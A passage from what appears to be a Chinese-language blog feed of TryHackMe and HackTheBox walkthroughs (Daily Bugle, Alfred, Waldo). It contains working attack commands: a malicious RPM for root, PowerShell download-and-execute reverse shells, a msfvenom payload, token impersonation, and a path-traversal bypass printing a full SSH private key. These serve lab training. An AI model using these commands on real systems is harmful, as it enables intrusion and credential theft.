-s <span class="hljs-built_in">dir</span> -t rpm -a all --before-install <span class="hljs-variable">$TF</span>/x.sh <span class="hljs-variable">$TF</span><br>Created package &#123;:path=&gt;<span class="hljs-string">&quot;x-1.0-1.noarch.rpm&quot;</span>&#125;<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ <span class="hljs-built_in">ls</span><br>42033.txt  Daily  <span class="hljs-built_in">hash</span>  joomblah.py  MosaicTheory.ovpn  x-1.0-1.noarch.rpm<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ sudo python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ sudo yum localinstall -y x-1.0-1.noarch.rpm<br>已加载插件：fastestmirror<br>正在检查 x-1.0-1.noarch.rpm: x-1.0-1.noarch<br>x-1.0-1.noarch.rpm 将被安装<br>正在解决依赖关系<br>--&gt; 正在检查事务<br>---&gt; 软件包 x.noarch.0.1.0-1 将被 安装<br>--&gt; 解决依赖关系完成<br><br>依赖关系解决<br><br>===============================================================================================================================================================================================================================================<br> Package                                             架构                                                     版本                                                     源                                                                 大小<br>===============================================================================================================================================================================================================================================<br>正在安装:<br> x                                                   noarch                                                   1.0-1                                                    /x-1.0-1.noarch                                                    40  <br><br>事务概要<br>===============================================================================================================================================================================================================================================<br>安装  1 软件包<br><br>总计：40  <br>安装大小：40  <br>Downloading packages:<br>Running transaction check<br>Running transaction <span class="hljs-built_in">test</span><br>Transaction <span class="hljs-built_in">test</span> succeeded<br>Running transaction<br>  正在安装    : x-1.0-1.noarch                                                                                                                                                                                                             1/1 <br>  验证中      : x-1.0-1.noarch                                                                                                                                                                                                             1/1 <br><br>已安装:<br>  x.noarch 0:1.0-1                                                                                                                                                                                                                             <br><br>完毕！<br>[jjameson@dailybugle ~]$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ <span class="hljs-built_in">cd</span> /tmp/<br>[jjameson@dailybugle tmp]$ <span class="hljs-built_in">ls</span><br>bash<br>[jjameson@dailybugle tmp]$ ./bash -p<br>bash-4.2<span class="hljs-comment"># id</span><br>uid=1000(jjameson) gid=1000(jjameson) euid=0(root) egid=0(root) 组=0(root),1000(jjameson)<br>bash-4.2<span class="hljs-comment"># cat /root/root.txt</span><br>ee.................................<br>bash-4.2<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Alfred</title>
    <link href="/post/Tryhackme-Alfred.html"/>
    <url>/post/Tryhackme-Alfred.html</url>
    
    <content type="html"><![CDATA[<p>How many ports are open? (TCP only)?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ sudo nmap -F 10.10.77.144 -Pn                                                                                                                                                                                         130 ⨯<br>Starting Nmap 7.92SVN ( https://google.com ) at 2022-07-20 09:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.77.144<br>Host is up (0.38s latency).<br>Not shown: 97 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>3389/tcp open  ms-wbt-server<br>8080/tcp open  http-proxy<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3<br></code></pre></td></tr></table></figure><p>What is the username and password for the log in panel(in the format username:password)?</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720095845324.png" alt="image-20220720095845324"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span>:<span class="hljs-literal">admin</span><br></code></pre></td></tr></table></figure><p>在NEW ITEM的第一个任务类型，在往下构建中，有一个可以执行命令的地方：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720101110503.png" alt="image-20220720101110503"></p><p>用execute shell 会报错，但是用 windows batch可以正常执行：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720101231860.png" alt="image-20220720101231860"></p><p>尝试让其直接走powershell上线CS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -nop -w hidden -c <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.11.75.230:80/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>不过不行，jenkins会在命令执行完将进程退出。但是为什么通过powershell就可以被挂起在哪里？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell iex(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.11.75.230/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp -Reverse -IPAddress 10.11.75.230 -Port 1337<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Crazyinside:~/HTB<span class="hljs-variable">$</span> nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">1337</span>         <br>listening on [<span class="hljs-type">any</span>] <span class="hljs-number">1337</span> ...<br>connect to <span class="hljs-function">[<span class="hljs-number">10.11</span><span class="hljs-type">.75.230</span>] <span class="hljs-title">from</span></span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-type">.77.144</span>] <span class="hljs-number">49225</span><br>Windows PowerShell running as user bruce on ALFRED<br>Copyright (C) <span class="hljs-number">2015</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-built_in">PS</span> C:\Program Files (x86)\Jenkins\workspace\test&gt;<br></code></pre></td></tr></table></figure><p>What is the user.txt flag? </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">    Directory: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">bruce</span>\<span class="hljs-title">desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span class="hljs-title">LastWriteTime</span>     <span class="hljs-title">Length</span> <span class="hljs-title">Name</span>                              </span><br><span class="hljs-function">----                -------------     ------ ----                              </span><br><span class="hljs-function">-<span class="hljs-title">a</span>---        10/25/2019  11:22 <span class="hljs-title">PM</span>         32 <span class="hljs-title">user.txt</span>                          </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">bruce</span>\<span class="hljs-title">desktop</span>&gt; <span class="hljs-title">type</span> <span class="hljs-title">user.txt</span></span><br><span class="hljs-function">7900..........................</span><br></code></pre></td></tr></table></figure><p>题目要求生成MSF载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.75.230 LPORT=4444 -f exe -o shell.exe<br></code></pre></td></tr></table></figure><p>What is the final size of the exe payload that you generated?</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">73802<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://10.11.75.230/shell.exe&#x27;,&#x27;shell.exe&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 10.11.75.230:4444 <br>[*] Sending stage (175686 bytes) to 10.10.77.144<br>[*] Meterpreter session 1 opened (10.11.75.230:4444 -&gt; 10.10.77.144:49243) at 2022-07-20 10:39:00 +0800<br><br>meterpreter &gt; load incognito<br>Loading extension incognito...Success.<br>meterpreter &gt; impersonate_token <br>Usage: impersonate_token &lt;token&gt;<br><br>Instructs the meterpreter thread to impersonate the specified token. All other actions will <span class="hljs-keyword">then</span> be made <span class="hljs-keyword">in</span> the context of that token.<br><br>Hint: Double backslash DOMAIN\\name (meterpreter quirk)<br>Hint: Enclose with quotation marks <span class="hljs-keyword">if</span> name contains a space<br><br>meterpreter &gt; impersonate_token <span class="hljs-string">&quot;BUILTIN\Administrators&quot;</span><br>[+] Delegation token available<br>[+] Successfully impersonated user NT AUTHORITY\SYSTEM<br>meterpreter &gt; getuid <br>Server username: NT AUTHORITY\SYSTEM<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Waldo</title>
    <link href="/post/HackTheBox-Waldo.html"/>
    <url>/post/HackTheBox-Waldo.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Waldo.png" alt="Waldo"></p><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.87<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 03:12:55 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.10.87                                     <br>Discovered open port 80/tcp on 10.10.10.87     <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.87 -p80 -Pn<br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 11:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.87<br>Host is up (0.092s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    nginx 1.12.2<br>|_http-server-header: nginx/1.12.2<br>|_http-trane-info: Problem with XML parsing of /evox/about<br>| http-title: List Manager<br>|_Requested resource was /list.html<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.47 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.87 -p80 -Pn<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs BASH">Crazy:~/HackTheBox$ curl -I http://10.10.10.87               <br>HTTP/1.1 302 Found<br>Server: nginx/1.12.2<br>Date: Mon, 29 Aug 2022 03:15:56 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: keep-alive<br>X-Powered-By: PHP/7.1.16<br>Location: /list.html<br></code></pre></td></tr></table></figure><p>抓个包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/fileWrite.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.87<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.10.87<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.87/list.html<br><br><span class="language-haskell"><span class="hljs-title">listnum</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-class"><span class="hljs-keyword">data</span>=</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829112238549.png" alt="image-20220829112238549"></p><p>文件读取：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829112325628.png" alt="image-20220829112325628"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829112623907.png" alt="image-20220829112623907"></p><h4 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt:"></a>User.txt:</h4><p>可以用CURL更方便查看一些：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&quot;file=dirRead.php&quot;</span> http:<span class="hljs-comment">//10.10.10.87/fileRead.php | jq -r .file</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type: application/json&#x27;</span>);<br>                <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>] = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/var/www/html/&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>]));<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type: application/json&#x27;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[false]&#x27;</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&quot;file=fileRead.php&quot;</span> http:<span class="hljs-comment">//10.10.10.87/fileRead.php | jq -r .file</span><br><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>        <span class="hljs-variable">$fileContent</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-literal">false</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>                <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-string">&quot;user.txt&quot;</span>) === <span class="hljs-literal">false</span>)&#123;<br>                        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-string">&quot;r&quot;</span>);<br>                        <span class="hljs-variable">$fileContent</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>,<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]));  <br>                        <span class="hljs-title function_ invoke__">fclose</span>();<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$fileContent</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&quot;file=fileWrite.php&quot;</span> http:<span class="hljs-comment">//10.10.10.87/fileRead.php | jq -r .file</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>        <span class="hljs-variable">$condition</span>[<span class="hljs-string">&#x27;result&#x27;</span>] = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;listnum&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;listnum&#x27;</span>]))&#123;<br>                        <span class="hljs-variable">$myFile</span> = <span class="hljs-string">&quot;/var/www/html/.list/list&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;listnum&#x27;</span>];<br>                        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$myFile</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>                        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>                        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-variable">$data</span>);<br>                        <span class="hljs-title function_ invoke__">fclose</span>();<br>                        <span class="hljs-variable">$condition</span>[<span class="hljs-string">&#x27;result&#x27;</span>] = <span class="hljs-literal">true</span>;<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$condition</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这过滤也太简单了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829112755957.png" alt="image-20220829112755957"></p><p>在一个docker环境中：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829112833522.png" alt="image-20220829112833522"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829113413967.png" alt="image-20220829113413967"></p><p>秘钥到手：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&quot;file=....//....//....//home/nobody/.ssh/.monitor&quot;</span> http://10.10.10.87/fileRead.php | jq -r .file                    <br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl<br>mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f<br>87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS<br>dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN<br>o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V<br>vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU<br>vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6<br>pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5<br>8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q<br>1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7<br>VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS<br>dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO<br>v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr<br>xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY<br>qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI<br>yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1<br>/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU<br>LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/<br>lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp<br>w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9<br>1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT<br>rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr<br>X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2<br>DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla<br>W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ssh -i id_waldo_nobody nobody@10.10.10.87<br>Welcome to Alpine!<br><br>The Alpine Wiki contains a large amount of how-to guides and general<br>information about administrating Alpine systems.<br>See 